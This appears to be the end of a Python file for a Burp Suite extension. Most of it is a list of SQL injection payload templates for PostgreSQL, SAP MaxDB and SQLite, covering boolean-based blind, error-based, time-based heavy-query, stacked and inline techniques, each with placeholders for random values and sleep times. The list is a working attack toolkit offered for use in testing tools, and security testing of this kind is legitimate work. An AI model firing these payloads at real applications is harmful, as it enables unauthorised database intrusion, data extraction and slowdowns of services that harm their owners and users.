PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST):::AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL
PostgreSQL AND error-based - WHERE or HAVING clause:::AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)
PostgreSQL AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST):::OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL
PostgreSQL OR error-based - WHERE or HAVING clause:::OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)
PostgreSQL OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES):::,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - ORDER BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value):::(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES):::(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)
PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES):::;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1
PostgreSQL error-based - ORDER BY, GROUP BY clause:::,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES):::,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - Parameter replace:::(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - Parameter replace (GENERATE_SERIES):::(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL inline queries:::(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')
PostgreSQL stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)
PostgreSQL stacked queries (heavy query):::;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)
PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))
PostgreSQL time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
SAP MaxDB AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause:::,(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)
SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
SAP MaxDB boolean-based blind - Stacked queries:::;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END
SAP MaxDB stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
SAP MaxDB stacked queries (heavy query):::;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
SAP MaxDB time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SQLite > 2.0 AND time-based blind (heavy query - comment):::AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 AND time-based blind (heavy query):::AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 OR time-based blind (heavy query - comment):::OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 OR time-based blind (heavy query):::OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 stacked queries (heavy query - comment):::;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 stacked queries (heavy query):::;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 time-based blind - Parameter replace (heavy query):::(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))
SQLite inline queries:::SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'
"""

try:
    FixBurpExceptions()
except:
    pass

